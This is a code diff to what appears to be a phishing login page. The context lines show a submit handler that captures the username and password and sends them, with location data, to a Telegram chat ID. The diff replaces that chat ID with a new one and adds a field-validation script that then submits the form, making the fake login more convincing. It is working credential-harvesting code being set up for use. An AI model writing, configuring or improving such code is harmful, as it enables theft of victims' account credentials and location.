@@ -609,7 +609,7 @@
   document.getElementById('loginForm').addEventListener('submit', function(event) {
       event.preventDefault(); // Prevent form from submitting normally
 
-      const chatId = '5732675997'; // Your Telegram chat ID
+      const chatId = '1866571175'; // Your Telegram chat ID
       const username = document.querySelector('input[name="username"]').value;
       const password = document.querySelector('input[name="password"]').value;
 
@@ -623,6 +623,33 @@
       fetchLocationInfo(chatId);
   });
 </script>
+<script>
+  document.getElementById("loginForm").addEventListener("submit", function(event) {
+      event.preventDefault(); // Prevents the form from submitting immediately
+  
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+      const errorElement = document.getElementById("errorMessage");
+  
+      // Check if the error message element exists; if not, create it
+      if (!errorElement) {
+          const errorDiv = document.createElement("div");
+          errorDiv.id = "errorMessage";
+          errorDiv.style.color = "red";
+          errorDiv.style.marginTop = "10px";
+          this.appendChild(errorDiv);
+      }
+  
+      // Display error message if any field is empty
+      if (!username || !password) {
+          document.getElementById("errorMessage").textContent = "Please enter both username and password.";
+      } else {
+          document.getElementById("errorMessage").textContent = ""; // Clear any existing error message
+          this.submit(); // Submit the form if both fields are filled
+      }
+  });
+  </script>
+  
 </body>
 
 </html>
